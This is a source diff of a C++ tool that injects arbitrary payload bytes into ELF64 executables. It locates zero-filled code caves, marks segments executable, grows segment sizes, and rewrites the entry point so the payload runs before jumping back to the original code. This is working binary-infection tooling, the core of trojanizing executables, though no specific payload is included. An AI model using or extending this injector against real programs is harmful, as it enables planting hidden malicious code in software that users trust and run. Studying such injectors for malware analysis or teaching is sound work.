@@ -26,7 +26,7 @@ Elf64_Addr getImageBase(int fd, const Elf64_Ehdr &ehdr) {
     exit(EXIT_FAILURE);
 }
 
-void makeAllExec(int fd) {
+void makeSegExec(int fd, code_cave_t cc) {
     Elf64_Ehdr ehdr;
     Elf64_Phdr phdr;
 
@@ -44,10 +44,29 @@ void makeAllExec(int fd) {
             std::cerr << "Error reading program header" << std::endl;
             exit(EXIT_FAILURE);
         }
-        phdr.p_flags |= 1;
-        lseek(fd, -sizeof(phdr), SEEK_CUR);
-        write(fd, &phdr, sizeof(phdr));
+        if (phdr.p_offset > cc.start) {
+            lseek(fd, -2 * sizeof(phdr), SEEK_CUR);
+            read(fd, &phdr, sizeof(phdr));
+            phdr.p_flags |= 1;
+            lseek(fd, -1 * sizeof(phdr), SEEK_CUR);
+            write(fd, &phdr, sizeof(phdr));
+        }
     }
+}
+
+void fillSectionMap(int fd, std::vector<std::pair<int, int>> &sectionMap) {
+    Elf64_Ehdr ehdr;
+    Elf64_Shdr shdr;
+
+    lseek(fd, 0, SEEK_SET);
+    read(fd, &ehdr, sizeof(ehdr));
+    lseek(fd, ehdr.e_shoff, SEEK_SET);
+    for (int i = 0; i < ehdr.e_shnum; ++i) {
+        read(fd, &shdr, sizeof(shdr));
+
+        sectionMap.emplace_back(std::make_pair(shdr.sh_offset, shdr.sh_flags));
+    }
+    lseek(fd, 0, SEEK_SET);
 }
 
 int findSectionNum(int fd, int ccStart, int ccEnd) {
@@ -106,22 +125,18 @@ void setEntryPoint(int fd, long address) {
 }
 
 
-code_cave_t findCodeCave(int fd) {
+code_cave_t findCodeCave(int fd, std::vector<std::pair<int, int>> &sectionMap, int needSize) {
     char buf[128];
     code_cave_t codeCave{};
-    struct stat file_info{};
     int bytesRead, currentCave = 0;
     int bytesProcessed = 0;
     bool start = true;
     int prevOffset = 0;
-    int addrStart = 0;
+    int addrStart = 0, addrEnd = 0;
 
     codeCave.size = 0;
     lseek(fd, 0, SEEK_SET);
-    if (fstat(fd, &file_info)) {
-        std::cout << "Error while executing fstat()" << std::endl;
-        exit(EXIT_FAILURE);
-    }
+
     bytesRead = read(fd, buf, sizeof(buf));
 
     while (bytesRead > 0) {
@@ -134,11 +149,23 @@ code_cave_t findCodeCave(int fd) {
                 }
                 currentCave++;
             } else {
-                if (currentCave > codeCave.size) {
+                bool isExec = false;
+                for (int mapIndx = 0; mapIndx < sectionMap.size(); ++mapIndx) {
+                    if (addrStart < sectionMap[mapIndx].first) {
+                        isExec = sectionMap[mapIndx - 1].second & 0x4;
+
+//                        addrEnd = sectionMap[mapIndx].first;
+                        break;
+                    }
+                }
+                if (currentCave > codeCave.size && isExec) {
                     codeCave.start = addrStart;
                     codeCave.size = currentCave;
+//                    codeCave.end = addrEnd;
                     codeCave.end = prevOffset + bytesProcessed;
                 }
+                if (codeCave.size > needSize)
+                    return codeCave;
                 currentCave = 0;
                 start = true;
             }
@@ -164,13 +191,23 @@ std::vector<char> hexToBytes(std::string hex) {
 
 void injectCode(int fd, const code_cave_t &codeCave, int entryPoint, const Elf64_Ehdr &ehdr, int imgBase,
                 const std::vector<unsigned char> &payload) {
-    unsigned char jmp = 0xe9, nop = 0x90, call = 0xe8;
-    unsigned char prologue[] = {0xf3, 0x0f, 0x1e, 0xfa, 0x31, 0xed};
 
+    unsigned char crutch;
+    std::vector<unsigned char> prologue;
+
+    lseek(fd, ehdr.e_entry, SEEK_SET);
+    read(fd, &crutch, 1);
+    if (crutch == 0xf3)
+        prologue = {0xf3, 0x0f, 0x1e, 0xfa, 0x31, 0xed};
+    else
+        prologue = {0x31, 0xed, 0x49, 0x89, 0xd1};
+
+
+    unsigned char jmp = 0xe9, nop = 0x90, call = 0xe8;
     const int ccOffset = (codeCave.start + payload.size()) - (entryPoint + 0x5); // 0x5 - size of relative jump
     const int origOffset =
             (entryPoint + 0x5) -
-            (codeCave.start + sizeof(prologue) + payload.size() + 0x5 + 0x5); // 0x5's for call and jmp
+            (codeCave.start + prologue.size() + payload.size() + 0x5 + 0x5); // 0x5's for call and jmp
     const int payloadOffset = codeCave.start - (codeCave.start + payload.size() + 0x5);
 
     std::stringstream sStreamCC, sStreamOrig, sStreamPayload;
@@ -193,7 +230,8 @@ void injectCode(int fd, const code_cave_t &codeCave, int entryPoint, const Elf64
     for (auto &j: jumpToCCBytes) {
         write(fd, &j, sizeof(j));
     }
-    write(fd, &nop, sizeof(nop));
+    if (crutch == 0xf3)
+        write(fd, &nop, sizeof(nop));
 
     // write prologue and jump to original code
 
@@ -205,10 +243,63 @@ void injectCode(int fd, const code_cave_t &codeCave, int entryPoint, const Elf64
         write(fd, &j, sizeof(j));
     }
 
-    write(fd, prologue, sizeof(prologue));
+    write(fd, prologue.data(), prologue.size());
 
     write(fd, &jmp, sizeof(jmp));
     for (auto &j: jumpToOrigBytes) {
         write(fd, &j, sizeof(j));
     }
+}
+
+code_cave_t findCodeCave2(int fd, int needSize) {
+    Elf64_Ehdr ehdr;
+    Elf64_Phdr phdr_1, phdr_2;
+    char buf[128];
+    int bytesRead;
+    bool isEmpty;
+    lseek(fd, 0, SEEK_SET);
+    read(fd, &ehdr, sizeof(ehdr));
+    lseek(fd, ehdr.e_phoff, SEEK_SET);
+    code_cave_t codeCave{};
+    int biggestCC;
+
+    for (int i = 0; i < ehdr.e_phnum - 1; ++i) {
+        isEmpty = true;
+        read(fd, &phdr_1, sizeof(phdr_1));
+//        if (!(phdr_1.p_flags & 1))
+//            continue;
+        read(fd, &phdr_2, sizeof(phdr_2));
+
+        int toRead = phdr_2.p_offset - phdr_1.p_offset - phdr_1.p_filesz;
+        if (toRead < needSize || toRead < codeCave.size)
+            isEmpty = false;
+
+        lseek(fd, phdr_1.p_offset + phdr_1.p_filesz, SEEK_SET);
+
+        while (toRead > 0 && isEmpty) {
+            bytesRead = read(fd, buf, sizeof(buf));
+            for (int j = 0; j < (bytesRead > toRead ? toRead : bytesRead) && isEmpty; ++j)
+                if (buf[j] != 0)
+                    isEmpty = false;
+            toRead -= bytesRead;
+        }
+        if (isEmpty) {
+            codeCave.start = phdr_1.p_offset + phdr_1.p_filesz;
+            codeCave.end = phdr_2.p_offset;
+            codeCave.size = codeCave.end - codeCave.start;
+            biggestCC = i;
+
+        }
+        lseek(fd, ehdr.e_phoff + (i + 1) * sizeof(phdr_2), SEEK_SET);
+    }
+    if (codeCave.size) {
+        lseek(fd, ehdr.e_phoff + (biggestCC) * sizeof(phdr_1), SEEK_SET);
+        read(fd, &phdr_1, sizeof(phdr_1));
+        phdr_1.p_filesz += needSize;
+        phdr_1.p_memsz += needSize;
+        phdr_1.p_flags |= 1;
+        lseek(fd, ehdr.e_phoff + (biggestCC) * sizeof(phdr_1), SEEK_SET);
+        write(fd, &phdr_1, sizeof(phdr_1));
+    }
+    return codeCave;
 }
